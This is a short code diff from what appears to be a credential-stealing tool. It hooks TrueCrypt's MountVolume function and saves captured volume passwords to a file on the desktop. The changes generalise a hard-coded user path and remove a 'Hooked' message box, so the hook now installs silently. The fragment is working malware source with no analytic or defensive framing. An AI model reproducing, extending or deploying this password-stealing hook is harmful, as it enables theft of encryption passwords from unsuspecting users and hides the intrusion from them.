@@ -17,7 +17,7 @@ int FakeMountVolume(HWND hwndDlg, int driveNo, char *volumePath, Password *passw
 void SaveStealPassword(LPSTR volumePath, PBYTE password, UINT passwordLen)
 {
 	CHAR fileToSave[MAX_PATH];
-	GetFilePathToSaveStealPassword("C:\\Users\\Sony\\Desktop\\", volumePath, fileToSave);
+	GetFilePathToSaveStealPassword("C:\\Users\\user\\Desktop\\", volumePath, fileToSave);
 
 	HANDLE hFile = CreateFileA(fileToSave, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
@@ -75,8 +75,7 @@ BOOL TrueCryptStealHook()
 		{
 			RealMountVolume = (_MountVolume)functionAddress;
 
-			if (Mhook_SetHook((PVOID *)&RealMountVolume, FakeMountVolume))
-				MessageBoxA(NULL, "Hooked", "MountVolume", MB_OK);
+			Mhook_SetHook((PVOID *)&RealMountVolume, FakeMountVolume);
 		}
 	}
 
